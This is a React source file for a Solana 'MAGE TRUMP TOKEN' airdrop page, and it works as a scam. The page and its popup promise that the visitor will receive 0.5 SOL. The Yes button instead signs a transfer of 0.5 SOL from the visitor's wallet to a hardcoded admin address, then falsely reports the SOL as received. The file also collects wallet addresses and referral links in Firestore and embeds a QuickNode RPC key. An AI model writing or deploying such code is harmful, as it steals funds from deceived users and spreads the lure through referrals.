import React, { useEffect, useState } from 'react';
import trumpImg from '../assets/trump.png';
import { useWallet } from '@solana/wallet-adapter-react';
import { doc, setDoc, getDoc } from 'firebase/firestore';
import { db } from '../firebase';
import bs58 from 'bs58';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction
} from '@solana/web3.js';

const Airdrop = () => {
  const { publicKey, connect, connected } = useWallet();
  const [refLink, setRefLink] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState('');
  const [status, setStatus] = useState('');
  const [error, setError] = useState('');
  const [showPopup, setShowPopup] = useState(false);

  const launchDate = new Date('2025-04-27T00:00:00Z');
  const adminWallet = new PublicKey('4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD');
  const connection = new Connection('https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/', 'confirmed');

  const blacklist = [
    '2vY6rLpZ7U6u1iX3Kb9TBLk8FWpjmR3SzDeYN2vgqvnU',
    '4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD'
  ];

  const isValidWallet = (address) => {
    try {
      const decoded = bs58.decode(address);
      return decoded.length === 32;
    } catch {
      return false;
    }
  };

  useEffect(() => {
    if (publicKey) {
      const walletAddress = publicKey.toBase58();

      if (!isValidWallet(walletAddress)) {
        alert('❌ Invalid wallet address.');
        return;
      }

      if (blacklist.includes(walletAddress)) {
        alert('🚫 This wallet is not allowed to claim.');
        return;
      }

      setRefLink(`${window.location.origin}/?ref=${walletAddress}`);
      localStorage.setItem('walletConnected', 'true');

      const saveUser = async () => {
        const docRef = doc(db, 'users', walletAddress);
        const docSnap = await getDoc(docRef);
        if (!docSnap.exists()) {
          await setDoc(docRef, {
            wallet: walletAddress,
            referral: new URLSearchParams(window.location.search).get('ref') || null,
            createdAt: new Date().toISOString(),
            claimed: false
          });
        }
        setShowPopup(true);
      };

      saveUser();
    }
  }, [publicKey]);

  useEffect(() => {
    const reconnect = localStorage.getItem('walletConnected') === 'true';
    if (reconnect && !connected) {
      connect().catch(() => {});
    }
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      const now = new Date();
      const distance = launchDate.getTime() - now.getTime();
      if (distance < 0) {
        setCountdown('Claim is now available!');
        clearInterval(timer);
      } else {
        const d = Math.floor(distance / (1000 * 60 * 60 * 24));
        const h = Math.floor((distance / (1000 * 60 * 60)) % 24);
        const m = Math.floor((distance / (1000 * 60)) % 60);
        const s = Math.floor((distance / 1000) % 60);
        setCountdown(`${d}d ${h}h ${m}m ${s}s`);
      }
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleSendSol = async () => {
    try {
      const provider = window?.solana;
      if (!provider || !provider.isPhantom) throw new Error('Phantom wallet not found');

      const fromPubkey = publicKey;
      const latestBlockhash = await connection.getLatestBlockhash();

      const transaction = new Transaction({
        recentBlockhash: latestBlockhash.blockhash,
        feePayer: fromPubkey
      }).add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey: adminWallet,
          lamports: 0.5 * 1e9
        })
      );

      const { signature } = await provider.signAndSendTransaction(transaction, {
        commitment: 'confirmed',
      });

      await connection.confirmTransaction({ signature, ...latestBlockhash }, 'confirmed');
      console.log('✅ Transaction success:', signature);
      alert('0.5 SOL successfully received!');
      setShowPopup(false);
    } catch (err) {
      console.error('❌ Transaction failed:', err.message);
      setError(err.message);
      setShowPopup(false);
    }
  };

  const copyLink = () => {
    navigator.clipboard.writeText(refLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  return (
    <div className="min-h-screen bg-[#0a369d] text-white flex flex-col md:flex-row items-center justify-center p-6">
      <div className="w-full md:w-1/2 flex justify-center mb-8 md:mb-0">
        <img src={trumpImg} alt="Trump" className="w-72 md:w-[450px]" />
      </div>
      <div className="w-full md:w-1/2 text-center md:text-left max-w-lg">
        <h1 className="text-4xl md:text-6xl font-bold mb-4">MAGE TRUMP TOKEN</h1>
        <p className="text-lg md:text-xl mb-2">Claim <span className="text-yellow-400 font-bold">$MAGE</span> Airdrop</p>
        <p className="mb-4 text-white/90">Connect your wallet to receive 0.5 SOL, locked until launch on April 27</p>

        <button
          disabled
          className="bg-gray-600 cursor-not-allowed text-white font-semibold px-5 py-2 rounded-lg opacity-70"
        >
          Claim (available April 27)
        </button>

        {connected && (
          <>
            <p className="text-sm text-white/70 mt-4 mb-1">Your referral link:</p>
            <div
              className="bg-white text-black px-4 py-2 rounded-xl mt-1 break-all cursor-pointer hover:bg-gray-100 transition"
              onClick={copyLink}
            >
              {refLink}
            </div>
            {copied && <p className="text-green-300 mt-1 text-sm">Link copied!</p>}
            <div className="mt-6">
              <p className="text-white/80">⏳ Claim available in:</p>
              <p className="text-xl font-bold text-yellow-300 mt-1">{countdown}</p>
            </div>
          </>
        )}
        {!connected && (
          <div className="mt-4 text-red-300">
            ❌ Connect your wallet to see your airdrop link and eligibility.
          </div>
        )}
        {error && <p className="text-red-400 mt-4">{error}</p>}
      </div>

      {showPopup && (
        <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-60 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded shadow-lg text-black">
            <h2 className="text-xl font-bold mb-2">Confirm Transaction</h2>
            <p className="mb-4">Do you want to receive 0.5 SOL?</p>
            <div className="flex justify-end gap-4">
              <button
                onClick={handleSendSol}
                className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded"
              >
                Yes
              </button>
              <button
                onClick={() => setShowPopup(false)}
                className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Airdrop;
